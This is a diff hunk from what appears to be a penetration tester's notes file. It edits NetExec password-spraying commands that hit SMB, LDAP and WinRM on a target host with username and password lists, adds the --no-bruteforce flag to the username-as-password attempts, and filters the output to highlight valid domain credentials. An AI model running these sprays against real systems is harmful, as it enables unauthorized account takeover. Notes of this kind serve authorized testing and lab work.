@@ -137,11 +137,11 @@ echo -n 'cGFzc3dvcmRpc2dvb2Q=' | base64 -d
 ## Spray Services
 (
 (nxc smb "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc smb "$TARGET" -u usernames -p usernames --continue-on-success &)
 (nxc ldap "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc ldap "$TARGET" -u usernames -p usernames --continue-on-success &)
 (nxc winrm "$TARGET" -u usernames -p passwords --continue-on-success &)
-(nxc winrm "$TARGET" -u usernames -p usernames --continue-on-success &)
+(nxc smb "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
+(nxc ldap "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
+(nxc winrm "$TARGET" -u usernames -p usernames --continue-on-success --no-bruteforce &)
 ) | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s+\[\+\] $DOM\\\S+:\S*' | sed -E 's/($DOM\\)([^:]+:[^ ]+)/\1\x1b[1;33m\2\x1b[0m/'
 
 ## Valid Creds
